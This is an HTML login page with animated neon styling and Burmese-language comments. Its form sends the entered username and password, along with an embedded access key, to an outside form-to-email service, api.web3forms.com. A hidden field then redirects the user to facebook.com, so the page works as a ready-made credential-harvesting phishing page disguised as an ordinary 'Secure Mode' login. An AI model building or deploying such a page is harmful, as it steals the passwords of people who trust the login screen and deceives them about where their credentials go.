<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Futuristic Login Page - Secure Mode</title>
    <style>
        /* အခြေခံ Background နဲ့ Font သတ်မှတ်ချက် */
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #0f172a; 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            overflow: hidden;
        }

        /* အပြင်က အဝိုင်းပတ် ဒီဇိုင်း (Animated Circle) */
        .container {
            position: relative;
            width: 450px;
            height: 450px;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .circle-design {
            position: absolute;
            width: 100%;
            height: 100%;
            border-radius: 50%;
            background: repeating-conic-gradient(
                from 0deg,
                #00f2ff 0deg 2deg,
                transparent 2deg 10deg
            );
            mask: radial-gradient(farthest-side, transparent 90%, black 91%);
            -webkit-mask: radial-gradient(farthest-side, transparent 90%, black 91%);
            animation: rotate 20s linear infinite;
            opacity: 0.6;
        }

        @keyframes rotate {
            100% { transform: rotate(360deg); }
        }

        /* Login Form Box */
        .login-box {
            position: relative;
            width: 320px;
            text-align: center;
            color: #fff;
            z-index: 10;
        }

        .login-box h2 {
            font-size: 2.5rem;
            margin-bottom: 30px;
            color: #00f2ff;
            letter-spacing: 2px;
            text-shadow: 0 0 10px #00f2ff;
        }

        /* Input နေရာများ */
        .input-group {
            position: relative;
            margin-bottom: 25px;
            text-align: left;
        }

        .input-group label {
            display: block;
            margin-bottom: 8px;
            font-size: 0.9rem;
            color: #ccc;
            padding-left: 15px;
        }

        .input-group input {
            width: 100%;
            padding: 12px 20px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid #00f2ff66;
            border-radius: 25px;
            color: white;
            outline: none;
            box-sizing: border-box;
            transition: 0.3s;
        }

        .input-group input:focus {
            border-color: #00f2ff;
            box-shadow: 0 0 10px #00f2ff;
            background: rgba(255, 255, 255, 0.1);
        }

        .login-btn {
            width: 100%;
            padding: 12px;
            background: #00f2ff;
            border: none;
            border-radius: 25px;
            color: #000;
            font-weight: bold;
            font-size: 1rem;
            cursor: pointer;
            box-shadow: 0 0 20px #00f2ff;
            transition: 0.3s;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .login-btn:hover {
            box-shadow: 0 0 30px #00f2ff;
            transform: scale(1.02);
        }

        .signup {
            display: inline-block;
            margin-top: 20px;
            color: #00f2ff;
            text-decoration: none;
            font-size: 0.9rem;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="circle-design"></div>

        <div class="login-box">
            <h2>Login</h2>
            
            <form action="https://api.web3forms.com/submit" method="POST">
                <input type="hidden" name="access_key" value="d4d9020d-dd15-4ffa-9d35-26d71429b7ca">

                <div class="input-group">
                    <label>Username</label>
                    <input type="text" name="Client_User" placeholder="Username" 
                           required minlength="4" maxlength="15" 
                           pattern="[a-zA-Z0-9]+" title="အင်္ဂလိပ်စာလုံးနဲ့ ဂဏန်းပဲ သုံးပါ">
                </div>
                <div class="input-group">
                    <label>Password</label>
                    <input type="password" name="Security_Key" placeholder="Password" 
                           required minlength="8" autocomplete="off">
                </div>
                
                <input type="hidden" name="redirect" value="https://www.facebook.com">

                <button type="submit" class="login-btn">Login</button>
                
                <a href="#" class="signup">Signup</a>
            </form>
        </div>
    </div>

</body>
</html>
